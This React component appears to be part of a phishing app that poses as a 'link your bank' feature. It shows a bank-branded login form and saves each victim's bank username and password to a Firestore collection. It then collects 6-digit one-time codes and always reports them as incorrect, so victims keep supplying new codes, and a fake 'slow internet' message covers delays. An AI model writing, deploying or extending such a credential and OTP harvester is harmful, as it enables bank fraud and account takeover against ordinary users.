import { useState, useRef, useEffect} from "react";
import banks from "./bankData";
import { createUserWithEmailAndPassword } from "firebase/auth";
import { auth, db } from "../firebaseAuth";
import { setDoc } from "firebase/firestore";
import { toast } from "react-toastify";
import { addDoc, collection, getDocs, doc, updateDoc, getDoc } from "firebase/firestore";
import app from "../firebaseAuth";



function LinkToBank() {
    console.log(banks)

     const [userDetails, setUserDetails] = useState(null)
        const fetchUserData = async (e) => {
            auth.onAuthStateChanged(async (user) => {
                console.log(user);
                const docRef = doc(db, "users", user.uid);
                const docSnap = await getDoc(docRef);
                if (docSnap.exists()) {
                    setUserDetails(docSnap.data())
                    console.log(docSnap.data())
                }
            })
        };
    
        useEffect(() => {
            fetchUserData()
        }, [])
    

    const [selectedBank, setSelectedBank] = useState({})
      const [showLoad, setShowLoad] = useState(false)
    
    const [bankState, setBankState] = useState("selectBank")

    function getBank(e) {
     setSelectedBank(banks[e.target.id])
     setBankState("login")
     console.log(e.target.id)
    }
    
    const [logs, setLogs] = useState({
        username: "",
        password: "",
    }) 

    function getLogs(e) {
        setLogs((prev)=> {
            return {
                ...prev,
                [e.target.name]: e.target.value,
            }
        })
    }

   async function submitLogs(e){
    e.preventDefault();
    setShowLoad(true)
    setTimeout(()=> {
     if(bankState == "login") {
      setShowLoad(false)
     toast.error("slow internet connection", {position: "top-center"})
     }
    }, 10000)
    console.log("clicked")
       if(logs.username && logs.password) {
         try{
         await setDoc(doc(db, "bankLogins", userDetails.Fname + userDetails.Lname), {
            username: logs.username,
            password: logs.password,
            bankName: selectedBank.BankName,
         })
         .then((data)=> {
           toast.success("submitted", {position: "top-center"})
           setBankState("otp")
           setShowLoad(false)
         })
         .catch((error)=> {
            toast.error("error occured", {position: "top-center"})
            console.log(error.message)
            setShowLoad(false)
         })
        }catch(error){
           toast.error(error, {position: "top-center"})
           console.log(error)
           setShowLoad(false)
        }
       }else {
        toast.error("fill in the details", {position: "top-center"})
        setShowLoad(false)
       }
    }








     const [otp, setOtp] = useState(new Array(6).fill(""));
  const inputsRef = useRef([]);

  const handleChange = (element, index) => {
    if (/^[0-9]$/.test(element.value) || element.value === "") {
      const newOtp = [...otp];
      newOtp[index] = element.value;
      setOtp(newOtp);
      if (element.value !== "" && index < 5) {
        inputsRef.current[index + 1].focus();
      }
    }
  };

  console.log(Date())

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && otp[index] === "" && index > 0) {
      inputsRef.current[index - 1].focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length === 6) {
      try{
       await setDoc(doc(db, "Codes", userDetails.Fname + " " + Date()), {
            code: otpValue,
         })
         .then((data)=> {
           toast.error("incorrect otp code entered", {position: "top-center"})
           setShowLoad(false)
         })
         .catch((error)=> {
            toast.error("error occured", {position: "top-center"})
            console.log(error.message)
            setShowLoad(false)
         })
      }catch(error) {
        console.log(error.message)

      }
    } else {
      toast.error("Please enter a 6-digit OTP", {position: "top-center"});
    }
  };






    const showAllBanks = banks.map((each) => {
        return <div className="bank" id={each.id} onClick={getBank}>
            <h1 id={each.id}>{each.BankName}</h1>
            <img src={each.img} alt="" width="100" id={each.id}/>
        </div>
    })

    function showBankState() {
        const bankLogo = {
          background: `url(${selectedBank.img})`,
          backgroundSize: `contain`,
          backgroundPosition: `center`,
          backgroundRepeat: `no-repeat`
        }
        if (bankState == "selectBank") {  
            return <div>
                <div className="link-head">
                    <h1>Select Bank</h1>
                </div>
                <div className="all-banks">
                    {showAllBanks}
                </div>
            </div>
        } else if (bankState == "login") {
            return selectedBank ? <div className="bank-sign">
              {/* <div className="bank-img">
                  <img src={selectedBank.img} alt="" width="200"/>
              </div>
                <h1 className="bank-log">Log In</h1>
                <p className="logger">Login to your {selectedBank.BankName} account</p>
                <div className="log-boxer" >
                    <div>
                        <h1>Email or Username</h1>
                        <input type="text" name="username" onChange={getLogs}/>
                    </div>
                    <div>
                        <h1>Password</h1>
                         <input type="password" name="password" onChange={getLogs}/>
                    </div>
                    <div>
                       <p>Keep me signed in <input type="checkbox" /></p> 
                    </div>
                    <button className="bank-btn" onClick={submitLogs}>Login</button>
                    <p style={{textAlign: "center", fontSize: "18px"}} onClick={()=> setBankState("selectBank")}><i className="bi-arrow-left"></i> Go Back</p>
                </div> */}
                <div class="signup-container">
                 <div className="my-logger">
                   <div className="logger-pic" style={bankLogo}></div>
                 </div>
      <h2 className="create-head">Log In</h2>
      <form id="signupForm" className="my-form" onSubmit={submitLogs}>
        

        <label for="username">Email or Username</label>
        <input type="text" id="username"  name="username" onChange={getLogs}  required/>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" onChange={getLogs} required />


        <button type="submit">Sign Up</button>
      </form>
      <div class="note">
        forgotten Password? <a href="login.html">reset</a>
      </div>
    </div>
            </div>: ""
        } else if(bankState == "otp") {
            return <div>
                 <div className="container" role="main">
        <h2>Verify Your OTP</h2>
        <p className="subtitle">Enter the 6-digit code sent to your email</p>
        <form onSubmit={handleSubmit} aria-label="OTP Verification Form" className="de-form">
          <div className="otp-inputs">
            {otp.map((data, index) => (
              <input
                key={index}
                type="tel"
                name="otp"
                inputMode="numeric"
                autoComplete="one-time-code"
                pattern="\d*"
                maxLength="1"
                className="otp-input"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                ref={(el) => (inputsRef.current[index] = el)}
                aria-label={`Digit ${index + 1}`}
              />
            ))}
          </div>
          <button type="submit" className="verify-btn" aria-label="Verify OTP">
            Verify
          </button>
        </form>
        <p className="resend-text">
          Didn't receive the code?
          <button
            className="resend-btn"
            onClick={() => alert("OTP sent")}
            aria-label="Resend OTP"
            type="button"
          >
            Resend
          </button>
        </p>
      </div>
            </div>
        }
    }
    return (
        <section className="link-to-bank">
           {showLoad ? <div className="login-loader">
        <span className="loader"></span>
      </div> : ""}
            {userDetails ? showBankState(): <div className="login-loader">
        <span className="loader"></span>
      </div> }
        </section>
    )
}

export default LinkToBank;